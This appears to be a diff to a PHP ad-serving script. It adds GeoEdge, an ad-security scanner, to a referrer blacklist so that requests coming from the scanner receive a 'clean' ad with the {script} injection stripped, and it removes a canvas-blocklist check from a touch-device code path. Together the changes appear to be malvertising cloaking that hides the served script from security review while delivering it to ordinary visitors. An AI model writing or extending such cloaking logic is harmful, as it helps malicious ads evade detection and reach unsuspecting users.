@@ -52,6 +52,7 @@
 	$blacklistedSubDivs2 	= array(); 
 	$blacklistedCountries 	= array();
 	$blacklistedContinents 	= array();
+	$blacklistedReferrers	= array("api.geoedge");
 
 	$sourceWeightListPerCountry = array("JP" => array("iOS" 	=> array("slither.io" => 8, "謎解き母からのメモ" => 1, "Photomath" => 1, "Magic.Piano" => 1, "スヌーピードロップス" => 1), 
 													  "Android" => array("YouCam.Makeup" => 8, "ANA" => 1, "スヌーピードロップス" => 1, "mora.WALKMAN.公式ミュージックストア～" => 1, "Music.player" => 1)
@@ -751,6 +752,18 @@
 		}
 	}
 
+	if (!$serveCleanAd && array_key_exists('HTTP_REFERER', $_SERVER))
+	{
+		foreach ($blacklistedReferrers as $blackListedReferrer)
+		{
+			if (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
+			{
+				$serveCleanAd = true;
+				break;
+			}
+		}
+	}
+
 	if ($serveCleanAd)
 	{
 		$resultHtml = str_replace("{script}", "", $resultHtml);
@@ -890,11 +903,6 @@
 						   			if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
 		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))
 									{
-										if (inBlockedCanvasList())
-										{
-											return;
-										}
-
 										setTimeout(function()
 										{
 											var topDomain = '';
